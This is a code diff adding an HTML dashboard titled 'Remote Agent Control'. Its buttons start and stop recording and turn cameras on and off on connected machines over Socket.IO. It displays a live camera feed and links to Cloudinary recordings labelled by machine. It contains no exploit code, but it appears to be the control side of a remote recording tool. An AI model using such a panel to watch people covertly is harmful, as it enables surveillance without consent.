@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Cloud Control</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            text-align: center;
+            background: #f4f4f4;
+            padding: 20px;
+        }
+
+        .card {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 10px auto;
+            max-width: 500px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        button {
+            padding: 10px 20px;
+            margin: 5px;
+            cursor: pointer;
+            border: none;
+            border-radius: 5px;
+            color: white;
+        }
+
+        .btn-rec {
+            background: #28a745;
+        }
+
+        .btn-stop {
+            background: #dc3545;
+        }
+
+        .btn-cam {
+            background: #007bff;
+        }
+
+        #camera-feed {
+            width: 100%;
+            background: #000;
+            min-height: 200px;
+            margin-top: 10px;
+        }
+
+        #video-list {
+            text-align: left;
+        }
+
+        a {
+            color: #007bff;
+            text-decoration: none;
+            display: block;
+            margin: 5px 0;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="card">
+        <h2>Remote Agent Control</h2>
+        <div id="status">Connecting...</div>
+        <button class="btn-rec" onclick="send('admin_start_all')">START REC</button>
+        <button class="btn-stop" onclick="send('admin_stop_all')">STOP REC</button>
+        <hr>
+        <button class="btn-cam" onclick="send('admin_start_camera')">CAM ON</button>
+        <button class="btn-stop" onclick="send('admin_stop_camera')">CAM OFF</button>
+        <img id="camera-feed" src="">
+    </div>
+
+    <div class="card">
+        <h3>Recent Recordings (Cloudinary)</h3>
+        <div id="video-list"></div>
+    </div>
+
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <script>
+        const statusEl = document.getElementById('status');
+
+        if (window.location.protocol === 'file:') {
+            statusEl.innerText = 'Open this dashboard via http://127.0.0.1:3000';
+            window.location.replace('http://127.0.0.1:3000');
+        }
+
+        const socketBaseUrl = `${window.location.protocol}//${window.location.host}`;
+        const socket = io(socketBaseUrl, { transports: ['websocket', 'polling'] });
+        const videoList = document.getElementById('video-list');
+
+        function send(event) { socket.emit(event); }
+
+        socket.on('ui_camera_display', (data) => {
+            document.getElementById('camera-feed').src = "data:image/jpeg;base64," + data.image;
+        });
+
+        socket.on('connect', () => {
+            statusEl.innerText = `Connected: ${socket.id}`;
+        });
+
+        socket.on('connect_error', (err) => {
+            statusEl.innerText = `Connection failed: ${err.message}`;
+        });
+
+        socket.on('new_video_link', (data) => {
+            const link = document.createElement('a');
+            link.href = data.url;
+            link.target = "_blank";
+            link.innerText = `🎥 Video from ${data.machine} - ${new Date().toLocaleTimeString()}`;
+            videoList.prepend(link);
+        });
+    </script>
+</body>
+
+</html>
